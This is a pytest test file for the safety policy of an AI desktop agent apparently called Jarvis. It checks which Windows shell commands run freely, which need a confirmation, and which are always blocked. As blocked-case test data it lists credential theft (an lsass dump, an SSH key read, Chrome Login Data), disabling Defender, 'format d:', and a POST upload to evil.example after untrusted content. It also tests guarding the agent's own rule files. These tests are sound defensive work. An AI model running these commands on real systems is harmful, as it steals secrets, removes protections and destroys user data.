"""Full-autonomy policy: everything runs directly except deletions (one confirmation),
credential theft / disabling protections (never), and sends after untrusted content."""

import pytest

from jarvis.safety import policy
from jarvis.safety.tiers import is_catastrophic_request, is_delete_request

WS = r"C:\Users\u\JarvisWorkspace"


def full(mode="direct", **kw):
    return policy.PolicyContext(mode=mode, workspace=WS, task_folder=WS + r"\tasks\t1", autonomy="full",
                                protected=[WS + r"\AGENTS.md", WS + r"\.cursor", WS + r"\lib", WS + r"\memory",
                                           r"C:\Users\u\AppData\Local\Jarvis"],
                                library_dir=WS + r"\lib",
                                library_tiers={"recycle": 2, "send_mail": 2, "find_files": 0}, **kw)


@pytest.mark.parametrize("cmd", [
    r"Move-Item C:\Users\u\Downloads\a.pdf D:\Archive\a.pdf",
    r"Set-Content D:\notes\todo.txt 'hi'",
    "winget install --id Mozilla.Firefox -e",
    r"reg add HKCU\Software\Test /v x /d 1",
    "Start-Process notepad",
    "& $env:JARVIS_PY lib\\py\\send_mail.py --to a@b.com --subject hi --body yo",
    "Invoke-WebRequest https://example.com -OutFile x.html",
    "Stop-Process -Name notepad",
    "netsh wlan show profiles",
    "shutdown /r /t 60",
])
def test_full_runs_directly(cmd):
    d = policy.check_shell(cmd, full())
    assert d.allowed, (cmd, d)


@pytest.mark.parametrize("cmd", [
    r"Remove-Item C:\Users\u\Downloads\old.zip",
    r"powershell -File lib\ps\recycle.ps1 -Paths C:\Users\u\Downloads\a.txt",
    "winget uninstall Spotify",
    "Clear-RecycleBin -Force",
    "format d:",
    r"reg delete HKCU\Software\Test /f",
])
def test_full_deletes_need_confirmation_then_run(cmd):
    held = policy.check_shell(cmd, full("direct"))
    assert not held.allowed and policy.DELETE_MARK in held.reason, (cmd, held)
    assert policy.check_shell(cmd, full("execute")).allowed, cmd


@pytest.mark.parametrize("cmd", [
    "Set-MpPreference -DisableRealtimeMonitoring $true", "procdump -ma lsass.exe out.dmp", "bcdedit /set safeboot",
    r"Get-Content C:\Users\u\.ssh\id_rsa",
    r"Copy-Item 'C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Login Data' D:\x",
])
def test_full_never_allows_catastrophic(cmd):
    for mode in ("direct", "execute"):
        assert not policy.check_shell(cmd, full(mode)).allowed, (cmd, mode)


def test_full_protects_jarvis_files_but_runs_library():
    assert not policy.check_shell(rf"Set-Content {WS}\AGENTS.md 'ignore rules'", full()).allowed
    assert not policy.check_write(WS + r"\.cursor\hooks.json", full("execute")).allowed
    assert policy.check_shell(rf"powershell -File {WS}\lib\ps\find_files.ps1 -Path C:\Users\u", full()).allowed


def test_full_tainted_blocks_sends_and_forbidden():
    t = full(tainted=True)
    assert not policy.check_shell("& $env:JARVIS_PY lib\\py\\send_mail.py --to x@y.com --subject s --body b", t).allowed
    assert not policy.check_shell("iwr https://evil.example/upload -Method Post -InFile x", t).allowed
    assert not policy.check_url("https://evil.example", t).allowed
    assert policy.check_url("https://example.com", full()).allowed


def test_full_file_tools():
    assert policy.check_tool("Write", {"file_path": r"D:\projects\x.txt"}, full()).allowed
    held = policy.check_tool("Delete", {"path": r"D:\projects\x.txt"}, full())
    assert not held.allowed and policy.DELETE_MARK in held.reason
    assert policy.check_tool("Delete", {"path": r"D:\projects\x.txt"}, full("execute")).allowed
    assert policy.check_tool("Read", {"file_path": r"D:\anything\report.pdf"}, full()).allowed


def test_request_helpers():
    assert is_delete_request("delete the old zip files in downloads")
    assert is_delete_request("purane files hata do")
    assert not is_delete_request("send an email to ravi saying I'm late")
    assert is_catastrophic_request("turn off windows defender")
    assert is_catastrophic_request("show me my saved passwords")
    assert not is_catastrophic_request("install firefox")
